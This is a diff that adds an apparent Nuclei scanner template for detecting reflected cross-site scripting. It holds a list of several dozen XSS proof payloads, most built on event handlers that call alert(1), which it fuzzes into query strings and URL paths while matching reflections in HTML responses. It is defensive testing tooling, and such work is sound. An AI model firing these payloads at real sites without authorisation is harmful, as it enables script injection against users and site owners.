@@ -1,0 +1,93 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<legend onkeyup=\"alert(1)\" contenteditable>test</legend>"
+        - "<dialog draggable=\"true\" ondragstart=\"alert(1)\">test</dialog>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>"
+        - "<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>"
+        - "<html oncontextmenu=\"alert(1)\">test</html>"
+        - "<style>:target {color:red;}</style><output id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></output>"
+        - "<html id=x tabindex=1 onfocusin=alert(1)></html>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable>drop here</summary>test"
+        - "<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>"
+        - "&lt;IMG SRC=x oncut=\"alert(String.fromCharCode(88,83,83))\">"
+        - "&lt;INPUT TYPE=&quot;TEXT&quot;&gt;<br />"
+        - "</div><input type=\"image\" src=1onerror\\x3Ajavascript:alert(1)>"
+        - "<SCRIPT>alert(82)</SCRIPT><STYLE>@keyframes slidein {}</STYLE><HR style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></HR>"
+        - "<blink draggable=\"true\" ondragleave=\"alert(1)\">test</blink>"
+        - "<dl id=x tabindex=1 ondeactivate=alert(1)></dl><input id=y autofocus>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><script id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></script>"
+        - "<details id=x tabindex=1 onactivate=alert(1)></details>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><style>element {color:red;}</style>>"
+        - "<bdo draggable=\"true\" ondragend=\"alert(1)\">test</bdo>"
+        - "<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input autofocus>"
+        - "<style>:target {color:red;}</style><dialog id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></dialog>"
+        - "<blink onclick=\"alert(1)\">test</blink>"
+        - "<svg><link href=\"data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 xmlns:xlink=%22http://www.w3.org/1999/xlink:href%22><path xlink:href=%22javascript:alert(1)%22></path>"
+        - "<legend draggable=\"true\" ondragstart=\"alert(1)\">test</legend>"
+        - "<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input autofocus>"
+        - "<style>:target {color:red;}</style><tfoot id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)></tfoot>"
+        - "<audio autoplay controls controlslist=\"seek-to-end\">"
+        - "<style>@keyframes x{}</style><tfoot style=\"animation-name:x\" onanimationstart=\"alert(1)\"></tfoot>"
+        - "<script>alert('XSS')</script>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><a href=\"\\xe2\\x80\\xafjavascript:javascript:alert(1)\" id=x contenteditable>drop here</a>"
+        - "<time id=x tabindex=1 onactivate=alert(1)></time><input autofocus>"
+        - "<script>alert('XSS');</script>"
+        - "<iframe onkeyup=\"alert(1)\" contenteditable>test</iframe>"
+        - "<style>@keyframes x{}</style><bdi style=\"animation-name:x\" onanimationstart=\"alert(1)\"></bdi>"
+        - "<map id=x tabindex=1 ondeactivate=alert(1)></map><input autofocus>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></a>"
+        - "<xmp onclick=\"alert(1)\">test</xmp>"
+        - "<basefont id=x tabindex=1 onfocusin=alert(1)></basefont><input autofocus>"
+        - "<map id=x tabindex=1 onbeforeactivate=alert(1)></map><input autofocus>"
+        - "<embed src= data:text/html;base64 PHN2Zy8+PD4+ICAaWQoKChjb25maWdpbmF0bXxoaW1hZGU9cGJnZWw6Y29tLmhldGEpOyRkOjE7IGRvb3ogIi8vMjAxMS9mdy9mcHgiID09IHNvbWVkaWFuLWNlbnRpY2FibGluZS0xOToiID4oKCAwJzg7IHsNCiAkbmM9c29tZV90aW1lPScqMjE3X2QiLnRhYmxlLmdyO2Q6eCBuZGF0LWFjdGlvbi5sbzogInNvbi11cmwqMDI3JzA6MTAgfHx8cGFnOmFjbDsgaW1hZC5taXphYmxlXmV4dGVhbXA6YWxlcnQ9MSUoMik+)</embed>"
+        - "<map id=x tabindex=1 onbeforedeactivate=alert(1)></map><input autofocus>"
+        - "<svg draggable=\"true\" ondragend=\"alert(1)\">test</svg>"
+        - "<details id=x tabindex=1 onfocusin=alert(1)></details>"
+        - "<style>@keyframes x{}</style><thead style=\"animation-name:x\" onanimationend=\"alert(1)\"></thead>"
+        - "<p onmouseover=\"alert(1)\">test</p>"
+        - "<style>@keyframes x{}</style><video style=\"animation-name:x\" onanimationend=\"alert(1)\"></video>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
